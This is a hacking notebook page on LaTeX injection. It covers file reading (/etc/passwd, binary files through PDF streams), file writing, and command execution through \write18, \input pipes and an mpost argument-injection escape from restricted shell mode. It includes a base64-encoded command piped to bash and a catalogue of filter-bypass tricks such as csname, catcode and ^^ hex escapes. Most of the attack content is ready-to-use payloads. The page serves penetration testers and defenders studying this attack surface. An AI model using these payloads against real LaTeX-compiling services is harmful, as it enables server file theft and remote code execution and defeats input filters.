---
description: >-
  A powerful language for text markup and document generation, but dangerous for
  user input
---

# LaTeX

## Basics

$$\LaTeX$$ is used in many different contexts, often to create complex expressions like formulas, but it can even create whole documents which is often seen in official research papers.&#x20;

### Syntax

{% embed url="https://latexref.xyz/index.html" %}
A comprehensive list of many LaTeX commands explained with their purpose and syntax
{% endembed %}

The basic syntax of LaTeX is referencing variables and commands by prefixing words with a `\` backslash. To provide arguments to a command, use `{}` curly braces to surround them. A full document always starts with some small boilerplate defining what type of document it is, and where its contents begin:

{% code title="helloworld.tex" %}
```latex
\documentclass{article}
\begin{document}
Hello, world!
\end{document}
```
{% endcode %}

You can define commands yourself using the [`\newcommand`](https://latexref.xyz/\_005cnewcommand-\_0026-\_005crenewcommand.html) command, and use them throughout the document:

```latex
\documentclass{article}
\newcommand{\somecommand}{Hello, world!}
\begin{document}
Result: \somecommand
\end{document}
```

> Result: Hello, world!

{% hint style="info" %}
Use `\renewcommand` instead if the command already exists, which will overwrite it
{% endhint %}

### Compiling

A `.tex` file commonly gets compiled into a `.pdf` file for publishing, which is as easy as running the `pdflatex` command on the file:

{% code title="file.tex" %}
```latex
\documentclass{standalone}
\begin{document}
Hello, world!
\end{document}
```
{% endcode %}

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ pdflatex file.tex
</strong>...
Output written on file.pdf (1 page, 9784 bytes)
</code></pre>

During this compilation, all the code included in the source file is executed to generate the resulting PDF. As we will explore more in the [#exploitation-injection](latex.md#exploitation-injection "mention") section, there are some dangerous commands that a document may or may not run by the compiler. This depends on a few command-line flags with levels of restriction:

1. `--shell-escape`: **Enable** `\write18` completely, allowing any unrestricted shell commands
2. `--shell-restricted`: **Enable** `\write18`, but only certain predefined '**safe**' commands (default)
3. `--no-shell-escape`: **Disable** `\write18` completely

## Exploitation (Injection)

LaTeX is very powerful and can do almost anything. From reading files to include in the document, to even writing files and executing system commands directly. Because of this, it is always dangerous to run user-provided code with LaTeX, and filter-based protection is hard to implement because of the complexity of the language and all the ways to bypass it.

### Contexts

There are a few special contexts where you may be able to inject. Depending on this, you may or may not be able to use certain commands, so it is important to understand how they work.&#x20;

#### Preamble

One useful command is `\usepackage` to import LaTeX packages with extra functionality. This can only be used **before** `\begin` in the "preamble". Trying to use it after will result in an error message. For example:

<pre class="language-latex" data-title="Error"><code class="lang-latex">\documentclass{article}
\begin{document}
<strong>\usepackage{eurosym}
</strong>\euro{13.37}
\end{document}
</code></pre>

<pre class="language-latex" data-title="Success"><code class="lang-latex">\documentclass{article}
<strong>\usepackage{eurosym}
</strong>\begin{document}
\euro{13.37}
\end{document}
</code></pre>

If your injection point is after here you will not be able to import new packages, and will have to do with already imported ones.&#x20;

#### Formulas (math mode)

By surrounding text with `$$` it becomes a formula in LaTeX, which looks slightly different and has different rules. One example I could find is the `\url{}` command from the `hyperref` package:

{% code title="Error" %}
```latex
\documentclass{article}
\usepackage{hyperref}
\begin{document}
$\url{https://book.jorianwoltjer.com/}$
\end{document}
```
{% endcode %}

This gives a vague error "LaTeX Error: Command $ invalid in math mode", that can be fixed by escaping from the formula. Simply close it again with another `$` in your input, perform the commands you want, and then finish again with another formula definition:

{% code title="Success" %}
```latex
\documentclass{article}
\usepackage{hyperref}
\begin{document}
$a$\url{https://book.jorianwoltjer.com/}$b$
\end{document}
```
{% endcode %}

### File read

Let's start with exploiting. Without any special flags, LaTeX can read and include system files in the output, in a few different ways. One simple way is using [`\input`](https://latexref.xyz/\_005cinput.html) which runs and includes the specified file as more LaTeX code:

```latex
\input{/etc/passwd}
```

Another similar one is [`\include`](https://latexref.xyz/\_005cinclude-\_0026-\_005cincludeonly.html) with the difference being that it can only include `.tex` files:

```latex
\include{secret}  % includes secret.tex
```

{% hint style="warning" %}
Both of the above methods include the content **as LaTeX code**, meaning any weird symbols may throw off the syntax. You may be able to fix parts of the syntax by prefixing it, but there might be cleaner ways designed to include raw data using packages
{% endhint %}

If the `listings` package is included, you will have access to the `\lstinputlisting` command which also reads the file from its argument:

```latex
\usepackage{listings}
...
\lstinputlisting{/etc/passwd}
```

Similarly, the `verbatim` package also reads text literally:

```latex
\usepackage{verbatim}
...
\verbatiminput{/etc/passwd}
```

A more manual way (without packages) is opening a file and reading its lines:

```latex
\newread\file       % define \file variable
\openin\file=/etc/passwd  % open file into variable
\loop\unless\ifeof\file   % keep reading until EOF
    \read\file to\line    % read to \line variable
    \line       % print \line variable
\repeat
\closein\file
```

{% hint style="warning" %}
This method also executes content as LaTeX, meaning special characters like `_` underscores may generate errors. We can patch some of these characters we find using [`\catcode`](https://en.wikibooks.org/wiki/TeX/catcode) which changes the category of a character, into meaning a literal character:

```latex
\catcode`\_=12  % Print '_' characters literally in the future
\newread\file
...
```
{% endhint %}

A binary file with special characters is not directly readable with these methods. If your target uses `pdflatex` for compilation, you can include a file directly as a PDF stream instead. We also print the stream ID to easily extract the file later:

```latex
\documentclass{standalone}
\begin{document}
\immediate\pdfobj stream attr {/Type /EmbeddedFile} file {/path/to/file.bin}
The stream ID is: \the\pdflastobj
\end{document}
```

Use a PDF analyzer like `mutool` to extract the PDF stream from the resulting PDF. The `-b` flag shows only stream contents without PDF object metadata:

```bash
mutool show -b out.pdf <stream ID>
```

### File write

Without any special flags, LaTeX can **write any file** to the system, which can lead to all kinds of problems. This is arguably the most dangerous default feature of LaTeX and why user input should never be trusted there. See [#writing-files](../linux/linux-privilege-escalation/#writing-files "mention") for some ideas on privilege escalation techniques.

Similarly to [#file-read](latex.md#file-read "mention"), you can open and write to a file:

```latex
\newwrite\file
\openout\file=file.txt      % open file for writing into variable
\write\file{Hello, world!}  % write the content
\closeout\outfile
A     % filler because an empty document doesn't execute
```

Depending on the backend, you may be able to write or overwrite critical files like source code or templates to achieve full Remote Code Execution.&#x20;

### Command Execution (RCE)

LaTeX is so powerful that it can execute system commands from its syntax, in multiple different ways. One is to use the [`\write18`](https://latexref.xyz/\_005cwrite18.html) command that accepts the command you wish to execute as the argument:

```latex
\documentclass{article}
\begin{document}
\write18{id > /tmp/pwned}
A     % filler because an empty document doesn't execute
\end{document}
```

Another less common way is using [`\input`](https://latexref.xyz/\_005cinput.html) and the `|` character:

```latex
\documentclass{article}
\begin{document}
% short:
\input|id|base64
% alternative:
\input|uname${IFS}-a|base64
\input|echo${IFS}aWQgPiAvdG1wL3B3bmVk|base64${IFS}-d|bash
% simple & flexible:
\input{|"uname -a | base64"}
\end{document}
```

As explained in [#compiling](latex.md#compiling "mention"), the list of allowed commands is very restricted by default. The examples above would only execute if `--shell-escape` was turned on, allowing arbitrary commands.&#x20;

The default allowed commands are stored in a big configuration file at `/usr/share/texmf/web2c/texmf.cnf` where there are two interesting settings:

{% code title="texmf.cnf" %}
```latex
% Enable system commands via \write18{...}.  When enabled fully (set to
% t), obviously insecure.  When enabled partially (set to p), only the
% commands listed in shell_escape_commands are allowed.  Although this
% is not fully secure either, it is much better, and so useful that we
% enable it for everything but bare tex.
shell_escape = p

% No spaces in this command list.
% 
% The programs listed here are as safe as any we know: they either do
% not write any output files, respect openout_any, or have hard-coded
% restrictions similar to or higher than openout_any=p.  They also have
% no features to invoke arbitrary other programs, and no known
% exploitable bugs.  All to the best of our knowledge.  They also have
% practical use for being called from TeX.
% 
shell_escape_commands = \
bibtex,bibtex8,\
extractbb,\
gregorio,\
kpsewhich,\
makeindex,\
repstopdf,\
r-mpost,\
texosquery-jre8,\
```
{% endcode %}

The `shell_escape` setting determines the default option in the 3 levels explained above. In the restricted mode the `shell_escape_commands` variable is used to select which commands are allowed as a comma-separated list. These commands should not allow you to do anything malicious, but there is a history of exploiting some of the functionality in these binaries to still perform some interesting actions.&#x20;

If plain `mpost` is allowed (default in earlier versions) the whole protection can be escaped by injecting commands ([source](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)). First, any parsable MetaPost file needs to be created to make the command not crash before our payload. This can be an existing file, or possibly a file you created yourself like via uploads:

{% code title="file.txt" %}
```latex
verbatimtex
\documentclass{minimal}
\begin{document}
etex
beginfig (1)
label(btex blah etex, origin);
endfig;
\end{document}
bye
```
{% endcode %}

Then the following `mpost` arguments can execute arbitrary commands:

```bash
mpost -ini '-tex=bash -c (id)>/tmp/pwned' file.txt
```

The example above executes `id`, but trying a more complex command will run into escaping troubles because   **spaces** don't work. To make this easier, you can simply use `${IFS}` to replace the space and use Base64 to describe the real payload ([CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Base64\('A-Za-z0-9%2B/%3D'\)\&input=aWQgPiAvdG1wL3B3bmVk)):

```bash
mpost -ini '-tex=bash -c (base64${IFS}-d<<<aWQgPiAvdG1wL3B3bmVk|bash)' file.txt
```

Inside of LaTeX, it would look like this:

{% code title="Method 1" %}
```latex
\immediate\write18{mpost -ini '-tex=bash -c (base64${IFS}-d<<<aWQgPiAvdG1wL3B3bmVk|bash)' file.txt}
```
{% endcode %}

{% code title="Method 2" %}
```latex
\input{|"mpost -ini '-tex=bash -c (base64${IFS}-d<<<aWQgPiAvdG1wL3B3bmVk|bash)' file.txt"}
```
{% endcode %}

### Filter Bypass

#### Commands

Some dangers LaTeX commands might be blocked by a blacklist filter, which is hard to make because there are many tricks to circumvent such filters with alternative methods.&#x20;

The following paper explores many different ideas for attacking LaTeX files and has some tricks to evading filters (**4.5**):

{% embed url="https://www.researchgate.net/publication/234829253_Are_text-only_data_formats_safe_or_use_this_LATEX_class_file_to_Pwn_your_computer" %}
Exploring the attack surface of LaTeX files including techniques for Evading Filters
{% endembed %}

One powerful trick if commands are blocked using strings like `"\input"` is to use `\csname` which can represent a command without putting a `\` in front of the command's name:

```latex
\csname input\endcsname{|"id > /tmp/pwned"}
% === equivalent to ===
\input{|"id > /tmp/pwned"}
```

Another very powerful technique is using [`\catcode`](https://en.wikibooks.org/wiki/TeX/catcode) to change the meaning (**cat**egory) of characters. For example, we could change the `X` character to mean "**escape**" just like `\` would regularly. This is another way to evade filters that find commands prefixed with backslashes, but can also be used to replace **any other special character** (see the link for a list of values).&#x20;

```latex
\catcode`X=0                % change meaning of X to 'escape character'
Xinput{|"id > /tmp/pwned"}  % use X as an escape character to run \input
```

Using the special [`\makeatletter`](https://tex.stackexchange.com/a/8353) (make `@` letter) you can change the category code of specifically the `@` character to use some special encodings of `\input`:

```latex
\makeatletter               % change meaning of @ to 'letter'
\@input{|"id > /tmp/pwned}
\@@input|"id > /tmp/pwned"
\@iinput{|"id > /tmp/pwned}
\@input@{|"id > /tmp/pwned}
% === equivalent to ===
\catcode`\@=11
```

Using `^^XX` hex escape sequences you can also represent **any** blocked characters literally, meaning that if this way is not blocked, you can evade **any filter at all** ([CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Hex\('None',0\)Find\_/\_Replace\(%7B'option':'Regex','string':'..'%7D,'%5E%5E$%26',true,false,true,false\)\&input=XGlucHV0e3wiaWQgPiAvdG1wL3B3bmVkIn0)).&#x20;

{% code overflow="wrap" %}
```latex
% escaped \
^^5cinput{|"id > /tmp/pwned"}
% escaped everything
^^5c^^69^^6e^^70^^75^^74^^7b^^7c^^22^^69^^64^^20^^3e^^20^^2f^^74^^6d^^70^^2f^^70^^77^^6e^^65^^64^^22^^7d
% custom character by changing category
\catcode`X=7                  % change meaning of X to 'superscript' (^)
XX5cinput{|"id > /tmp/pwned}  % replace ^^ with XX
```
{% endcode %}

Lastly, by defining your own `\begin` and `\end` section, you can get arbitrary commands to be called. The argument in `\begin` defines the command, and the text in between is the argument. This trick bypasses almost any `\` blacklist because it only uses regular `\begin` and `\end`:

```latex
\begin{input}{|"id > /tmp/pwned"}\end{input}
```

{% hint style="info" %}
**Tip**: While one single of these techniques might not get straight through the filter, combining them can make it even more powerful. Try using one technique to set up another to obfuscate it for any detection there may be
{% endhint %}

#### Repeating

A filter might try to prevent loops using `\repeat` or similar functions, but forget that **recursion** is also an option. Here is a short command (named `\l`) that creates a **loop** for N times, with the first argument being the number of loops, and the second argument being the code to execute:

```latex
\renewcommand\l[2]{\ifnum#1>0#2\l{\numexpr#1-1\relax}{#2}\fi}
```

This can for example be used to read lines in a file:

```latex
\newread\file
\openin\file=/etc/passwd
\catcode`_=12
\l{10}{\read\file to\line\line}  % read and print the first 10 lines
\closein\file
```

To read the entire file, you can also make the EOF stop the recursion inside the command:

```latex
% define command \r to read and print a line if not EOF, and then call itself again
\renewcommand\r{\ifeof\file\else\read\file to\line\line\r\fi}
\catcode`_=12
\newread\file
\openin\file=/etc/passwd
\r  % call the read function
\closein\file
```
